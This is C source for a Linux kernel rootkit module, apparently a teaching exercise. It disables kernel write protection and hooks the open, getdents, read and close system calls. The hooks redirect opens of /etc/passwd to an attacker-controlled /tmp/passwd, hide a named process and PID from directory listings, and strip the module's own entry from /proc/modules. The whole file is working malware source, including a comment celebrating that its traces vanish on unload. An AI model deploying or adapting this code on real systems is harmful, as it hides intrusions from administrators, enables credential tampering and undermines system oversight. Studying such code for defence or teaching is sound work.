#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

#define ETC_PASSWD "/etc/passwd"
#define TMP_PASSWD "/tmp/passwd"
#define PROC "/proc/modules"
#define SNEAKY_MOD "sneaky_mod"

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))
static int file_descr = -1;
struct linux_dirent{
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[];
};

int sneaky_pid;

module_param(sneaky_pid, int, 0);

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);

//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_open(const char *pathname, int flags, mode_t mode) 
{
  int ret;
  if (!strcmp(pathname, ETC_PASSWD)) {

    copy_to_user(pathname, TMP_PASSWD, sizeof(TMP_PASSWD));
    ret = original_open(pathname, flags, mode);
  } else {
    ret = original_open(pathname, flags, mode);
    if (!strcmp(pathname, PROC)) {
      file_descr = ret;
    }
  }
  return ret;
}

asmlinkage int (*original_close) (int fd);

asmlinkage int sneaky_close (int fd) {
  if (fd == file_descr) {
    file_descr = -1;
  }
  return original_close(fd);
}

asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent* dirpcd, unsigned int count);

asmlinkage int sneaky_getdents (unsigned int fd, struct linux_dirent* dirp, unsigned int count) {
  int read, pos;
  struct linux_dirent * curr = NULL;
  struct linux_dirent * prev = NULL;
  char str_id[32];
  char *s_name = "sneaky_process";
  sprintf(str_id, "%d", sneaky_pid);
  read = (*original_getdents) (fd, dirp, count);
  
  for (pos = 0; pos < read;) {
    curr = (struct linux_dirent *) ((char*) dirp + pos);
    if (strcmp(curr->d_name, s_name) == 0 || strcmp(curr->d_name, str_id) == 0) {
      curr->d_name[0] = '\0';
      read -= curr->d_reclen;
      if (prev) {
	prev->d_reclen += curr->d_reclen;
      }
    }
    pos += curr->d_reclen;
    prev = curr;
  }
  return read;
}

asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count) {
  ssize_t ret;
  ret = original_read(fd, buf, count);
  if (file_descr == fd) {
    char * start, * end;
    start = strstr(buf, SNEAKY_MOD);
    if (start) {
      end = strchr(start, '\n');
      if (end) {
	memcpy(start, end + 1, ret - (int) (end - (char *) buf));
	ret -= (int)(end - start);
      }
    }
  }
  return ret;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_open;
  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;
   original_read = (void*)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;
   original_close = (void*)*(sys_call_table + __NR_close);
   *(sys_call_table + __NR_close) = (unsigned long)sneaky_close;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_open;
  *(sys_call_table + __NR_getdents) = (unsigned long) original_getdents;
   *(sys_call_table + __NR_close) = (unsigned long)original_close;
   *(sys_call_table + __NR_read) = (unsigned long)original_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

